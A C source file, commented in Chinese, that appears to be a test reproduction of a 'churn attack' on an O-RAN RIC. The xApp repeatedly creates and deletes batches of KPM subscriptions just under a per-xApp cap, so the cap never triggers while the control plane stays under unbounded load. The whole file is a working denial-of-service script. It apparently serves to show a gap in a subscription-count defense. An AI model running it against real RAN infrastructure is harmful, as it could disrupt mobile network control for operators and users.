/*
 * xapp_churn.c — "间歇性建删循环攻击"（churn attack）最小复现（smoke test第2轮）。
 *
 * 动机：辩论指出的增量伤口——朴素计数 CAP（稳态活跃订阅数上限）挡不住的攻击类：
 * 攻击者每轮订 batch 笔（batch < CAP）再全部删除，稳态活跃数始终 < CAP，
 * CAP 闸门永不 REFUSE，但建删操作速率无界 → RIC/E2 持续满负荷处理 ASN.1 编解码、
 * 状态表增删与 E2 侧 SM 会话反复创建销毁。
 *
 * 用法: xapp_churn [batch] [n_rounds] [round_delay_us]
 *   batch:         每轮订阅笔数（默认 60，故意 < 通行 CAP=64）
 *   n_rounds:      循环轮数（0 或缺省 = 无限，SIGINT 结束）
 *   round_delay_us: 每轮间隔微秒（缺省 0 = 全速）
 *
 * 输出: 每 200 轮打印一次建删速率（subs/s、dels/s、ops/s）。
 */
#include "../../../../src/xApp/e42_xapp_api.h"
#include "../../../../src/util/alg_ds/alg/defer.h"
#include "../../../../src/util/time_now_us.h"

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

static
kpm_event_trigger_def_t gen_ev_trig(uint64_t period)
{
  kpm_event_trigger_def_t dst = {0};
  dst.type = FORMAT_1_RIC_EVENT_TRIGGER;
  dst.kpm_ric_event_trigger_format_1.report_period_ms = period;
  return dst;
}

static
meas_info_format_1_lst_t gen_meas_info_format_1_lst(const char* action)
{
  meas_info_format_1_lst_t dst = {0};
  dst.meas_type.type = NAME_MEAS_TYPE;
  dst.meas_type.name = cp_str_to_ba(action);
  dst.label_info_lst_len = 1;
  dst.label_info_lst = calloc(1, sizeof(label_info_lst_t));
  assert(dst.label_info_lst != NULL && "Memory exhausted");
  dst.label_info_lst[0].noLabel = calloc(1, sizeof(enum_value_e));
  assert(dst.label_info_lst[0].noLabel != NULL && "Memory exhausted");
  *dst.label_info_lst[0].noLabel = TRUE_ENUM_VALUE;
  return dst;
}

static
kpm_act_def_format_1_t gen_act_def_frmt_1(const char** action)
{
  kpm_act_def_format_1_t dst = {0};
  dst.gran_period_ms = 100;
  size_t count = 0;
  while (action[count] != NULL) count++;
  dst.meas_info_lst_len = count;
  dst.meas_info_lst = calloc(count, sizeof(meas_info_format_1_lst_t));
  assert(dst.meas_info_lst != NULL && "Memory exhausted");
  for(size_t i = 0; i < dst.meas_info_lst_len; ++i)
    dst.meas_info_lst[i] = gen_meas_info_format_1_lst(action[i]);
  return dst;
}

static
kpm_act_def_t gen_act_def(const char** act)
{
  kpm_act_def_t dst = {0};
  dst.type = FORMAT_1_ACTION_DEFINITION;
  dst.frm_1 = gen_act_def_frmt_1(act);
  return dst;
}

static void sm_cb_kpm(sm_ag_if_rd_t const* rd)
{
  (void)rd; // 攻击者不关心指示数据
}

volatile sig_atomic_t stop_flag = 0;
static void on_sigint(int sig){ (void)sig; stop_flag = 1; }

int main(int argc, char *argv[])
{
  long batch = (argc > 1) ? atol(argv[1]) : 60;       // 默认 60 < CAP=64
  long n_rounds = (argc > 2) ? atol(argv[2]) : 0;     // 0 = 无限
  long delay_us = (argc > 3) ? atol(argv[3]) : 0;

  fr_args_t args = init_fr_args(argc, argv);
  init_xapp_api(&args);
  sleep(1);

  e2_node_arr_t nodes = e2_nodes_xapp_api();
  defer({ free_e2_node_arr(&nodes); });
  assert(nodes.len > 0);
  printf("[churn] Connected E2 nodes = %d\n", nodes.len);
  printf("[churn] batch=%ld rounds=%s delay=%ldus\n",
         batch, n_rounds == 0 ? "inf" : "finite", delay_us);

  signal(SIGINT, on_sigint);
  signal(SIGTERM, on_sigint);

  const int KPM_ran_function = 2;
  long round = 0, subs_ok = 0, subs_fail = 0, dels_ok = 0, dels_fail = 0;
  int64_t t0 = time_now_us();
  sm_ans_xapp_t* handles = calloc((size_t)(nodes.len * batch), sizeof(sm_ans_xapp_t));
  assert(handles != NULL && "Memory exhausted");

  while(stop_flag == 0 && (n_rounds == 0 || round < n_rounds)){
    // 阶段 1：订阅 batch 笔（逐节点循环分配，模拟多节点 churn）
    size_t h_idx = 0;
    for (long b = 0; b < batch; ++b) {
      int i = (int)(b % nodes.len);
      kpm_sub_data_t kpm_sub = {0};
      defer({ free_kpm_sub_data(&kpm_sub); });
      kpm_sub.ev_trg_def = gen_ev_trig(100 /* ms */);
      kpm_sub.sz_ad = 1;
      kpm_sub.ad = calloc(1, sizeof(kpm_act_def_t));
      assert(kpm_sub.ad != NULL && "Memory exhausted");

      const char *act_gnb[] = {"DRB.RlcSduDelayDl", NULL};
      *kpm_sub.ad = gen_act_def(act_gnb);

      sm_ans_xapp_t h = report_sm_xapp_api(&nodes.n[i].id, KPM_ran_function, &kpm_sub, sm_cb_kpm);
      handles[h_idx++] = h;
      if(h.success == false) subs_fail++; else subs_ok++;
    }
    // 阶段 2：全部删除（只删成功的 handle）
    for (long b = 0; b < batch; ++b) {
      if (handles[b].success == true) {
        rm_report_sm_xapp_api(handles[b].u.handle);
        handles[b].success = false;
        dels_ok++;
      } else {
        dels_fail++;
      }
    }
    round++;
    if(round % 200 == 0){
      int64_t now = time_now_us();
      double el = (now - t0) / 1e6;
      printf("[churn] round=%ld subs_ok=%ld subs_fail=%ld dels_ok=%ld "
             "elapsed=%.2fs ops_rate=%.1f/s (subs %.1f/s + dels %.1f/s)\n",
             round, subs_ok, subs_fail, dels_ok, el,
             (subs_ok + subs_fail + dels_ok + dels_fail) / el,
             subs_ok / el, dels_ok / el);
      fflush(stdout);
    }
    if(delay_us > 0) usleep(delay_us);
  }

  int64_t now = time_now_us();
  double el = (now - t0) / 1e6;
  printf("[churn] 结束: round=%ld subs_ok=%ld subs_fail=%ld dels_ok=%ld dels_fail=%ld "
         "elapsed=%.2fs avg_ops=%.1f/s\n",
         round, subs_ok, subs_fail, dels_ok, dels_fail, el,
         (subs_ok + subs_fail + dels_ok + dels_fail) / el);
  fflush(stdout);

  free(handles);
  while(try_stop_xapp_api() == false) usleep(1000);
  printf("[churn] exit\n");
  return 0;
}
